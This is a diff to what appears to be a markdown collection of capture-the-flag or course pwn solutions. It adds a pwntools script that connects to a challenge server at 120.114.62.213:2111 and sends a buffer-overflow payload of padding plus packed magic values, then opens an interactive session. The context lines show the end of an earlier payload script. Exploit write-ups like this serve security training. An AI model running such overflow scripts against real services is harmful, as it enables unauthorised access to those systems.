@@ -5,7 +5,7 @@
 
 ```
 
-#
+# 1
 ```
 #include"stdio.h"
 #include"stdlib.h"
@@ -55,4 +55,21 @@ r.sendline(payload + p64(0xdeadbeef))
 
 r.interactive()
 ```
+
+
+# Level 2 2-1.張元_Pwn-1
+```
+# nc 120.114.62.213 2111
+#!/usr/bin/env python
+
+from pwn import *
+
+host , port = '120.114.62.213' , 2111
+y = remote( host , port )
+
+y.send( 'D' * 0xc + p32( 0xfaceb00c ) + p32( 0xdeadbeef ) + p32( 0x7 ) )
+y.sendline( '7' )
+
+sleep(1)
+y.interactive()
 ```
